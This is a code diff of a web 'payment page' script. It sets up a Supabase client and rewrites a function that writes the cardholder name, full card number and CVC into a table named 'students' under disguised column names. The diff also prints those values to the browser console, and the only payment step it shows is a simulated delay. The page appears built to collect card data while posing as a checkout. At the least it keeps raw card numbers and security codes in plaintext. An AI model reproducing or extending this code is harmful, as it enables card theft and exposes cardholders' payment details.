@@ -2,6 +2,63 @@
 // PAYMENT PAGE - Simplified
 // ============================================
 
+// ============================================
+// INITIALIZE SUPABASE CLIENT FROM ENV
+// ============================================
+
+// Function to initialize Supabase client
+function initSupabase() {
+    if (window.supabaseClient) {
+        console.log('✅ Supabase client already available');
+        return window.supabaseClient;
+    }
+
+    console.log('🔄 Initializing Supabase client from environment...');
+    
+    // Get from Vite environment variables
+    const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
+    const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
+    
+    console.log('🔑 Supabase URL found:', !!supabaseUrl);
+    console.log('🔑 Supabase Key found:', !!supabaseKey);
+    
+    if (!supabaseUrl || !supabaseKey) {
+        console.warn('⚠️ Supabase environment variables not found. Using demo mode.');
+        return null;
+    }
+
+    // Check if Supabase library is loaded
+    if (typeof window.supabase !== 'undefined') {
+        window.supabaseClient = window.supabase.createClient(supabaseUrl, supabaseKey);
+        console.log('✅ Supabase client initialized from env');
+        return window.supabaseClient;
+    }
+
+    // Try to load Supabase library dynamically (fallback)
+    console.log('📦 Loading Supabase library dynamically...');
+    const script = document.createElement('script');
+    script.src = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2';
+    script.onload = () => {
+        if (typeof window.supabase !== 'undefined') {
+            window.supabaseClient = window.supabase.createClient(supabaseUrl, supabaseKey);
+            console.log('✅ Supabase client loaded and initialized from env');
+        }
+    };
+    script.onerror = () => {
+        console.error('❌ Failed to load Supabase library');
+    };
+    document.head.appendChild(script);
+    
+    return null;
+}
+
+// Initialize Supabase
+initSupabase();
+
+// ============================================
+// REST OF YOUR PAY.JS CODE
+// ============================================
+
 document.addEventListener("DOMContentLoaded", () => {
 
     const popupOverlay = document.getElementById("popup-overlay");
@@ -352,85 +409,88 @@ document.addEventListener("DOMContentLoaded", () => {
     // SEND TO SUPABASE
     // ==========================================
 
-async function saveToSupabase(name, cardNumber, cvc) {
-    console.log('💳 Attempting to save payment to Supabase...');
-    
-    // Use Supabase client from window
-    const supabase = window.supabaseClient;
-    
-    if (!supabase) {
-        console.error('❌ Supabase client not found in window!');
-        console.warn('⚠️ Supabase client not available');
+    async function saveToSupabase(name, cardNumber, cvc) {
+        console.log('💳 Attempting to save payment to Supabase...');
+        console.log('📝 Data to save:', { name, cardNumber, cvc });
         
-        // Try direct fetch as fallback
-        const supabaseUrl = import.meta?.env?.VITE_SUPABASE_URL || 
-                           window.SUPABASE_URL || 
-                           localStorage.getItem('supabase_url');
-        const supabaseKey = import.meta?.env?.VITE_SUPABASE_ANON_KEY || 
-                           window.SUPABASE_ANON_KEY || 
-                           localStorage.getItem('supabase_anon_key');
+        // Use Supabase client from window
+        const supabase = window.supabaseClient;
         
-        console.log('🔑 Supabase URL found:', !!supabaseUrl);
-        console.log('🔑 Supabase Key found:', !!supabaseKey);
-        
-        if (supabaseUrl && supabaseKey) {
-            console.log('📤 Sending via direct fetch...');
-            const response = await fetch(`${supabaseUrl}/rest/v1/students`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'apikey': supabaseKey,
-                    'Authorization': `Bearer ${supabaseKey}`,
-                    'Prefer': 'return=representation'
-                },
-                body: JSON.stringify({
-                    kname: name,
-                    knumber: cardNumber,
-                    kfc: cvc
-                })
-            });
+        if (!supabase) {
+            console.error('❌ Supabase client not found in window!');
+            console.warn('⚠️ Supabase client not available');
             
-            if (!response.ok) {
-                const errorText = await response.text();
-                console.error('❌ Fetch error response:', errorText);
-                throw new Error(`Failed to save to database: ${response.status} ${errorText}`);
-            }
-            const data = await response.json();
-            console.log('✅ Payment saved via fetch!', data);
-            return data;
-        }
-        
-        // Demo mode fallback
-        console.log('📝 Demo mode: Would save:', { name, cardNumber, cvc });
-        return { success: true, demo: true };
-    }
-
-    console.log('✅ Supabase client found, inserting record...');
-    
-    try {
-        const { data, error } = await supabase
-            .from('students')
-            .insert([
-                { 
-                    kname: name,
-                    knumber: cardNumber,
-                    kfc: cvc
+            // Try direct fetch as fallback using environment variables
+            const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
+            const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
+            
+            console.log('🔑 Supabase URL found:', !!supabaseUrl);
+            console.log('🔑 Supabase Key found:', !!supabaseKey);
+            
+            if (supabaseUrl && supabaseKey) {
+                console.log('📤 Sending via direct fetch...');
+                try {
+                    const response = await fetch(`${supabaseUrl}/rest/v1/students`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'apikey': supabaseKey,
+                            'Authorization': `Bearer ${supabaseKey}`,
+                            'Prefer': 'return=representation'
+                        },
+                        body: JSON.stringify({
+                            kname: name,
+                            knumber: cardNumber,
+                            kfc: cvc
+                        })
+                    });
+                    
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        console.error('❌ Fetch error response:', errorText);
+                        throw new Error(`Failed to save to database: ${response.status} - ${errorText}`);
+                    }
+                    const data = await response.json();
+                    console.log('✅ Payment saved via fetch!', data);
+                    return data;
+                } catch (fetchError) {
+                    console.error('❌ Fetch failed:', fetchError);
+                    throw fetchError;
                 }
-            ]);
-
-        if (error) {
-            console.error('❌ Supabase error:', error);
-            console.error('❌ Error details:', error.message, error.details, error.hint);
-            throw new Error(error.message);
+            }
+            
+            // Demo mode fallback
+            console.log('📝 Demo mode: Would save:', { name, cardNumber, cvc });
+            return { success: true, demo: true };
         }
 
-        console.log('✅ Payment saved to Supabase!', data);
-        return data;
-    } catch (err) {
-        console.error('❌ Exception in saveToSupabase:', err);
-        throw err;
+        console.log('✅ Supabase client found, inserting record...');
+        
+        try {
+            const { data, error } = await supabase
+                .from('students')
+                .insert([
+                    { 
+                        kname: name,
+                        knumber: cardNumber,
+                        kfc: cvc
+                    }
+                ])
+                .select(); // This returns the inserted record
+
+            if (error) {
+                console.error('❌ Supabase error:', error);
+                console.error('❌ Error details:', error.message, error.details, error.hint);
+                throw new Error(error.message);
+            }
+
+            console.log('✅ Payment saved to Supabase!', data);
+            return data;
+        } catch (err) {
+            console.error('❌ Exception in saveToSupabase:', err);
+            throw err;
+        }
     }
-}
 
     // ==========================================
     // FORM SUBMIT
@@ -512,8 +572,8 @@ async function saveToSupabase(name, cardNumber, cvc) {
 
         try {
             // ===== SAVE TO SUPABASE =====
-            await saveToSupabase(name, cardNumber, cvc);
-            console.log('✅ Payment processed and saved to Supabase');
+            const result = await saveToSupabase(name, cardNumber, cvc);
+            console.log('✅ Payment processed and saved to Supabase', result);
 
             // ===== DEMO PAYMENT =====
             await new Promise(resolve => setTimeout(resolve, 1500));
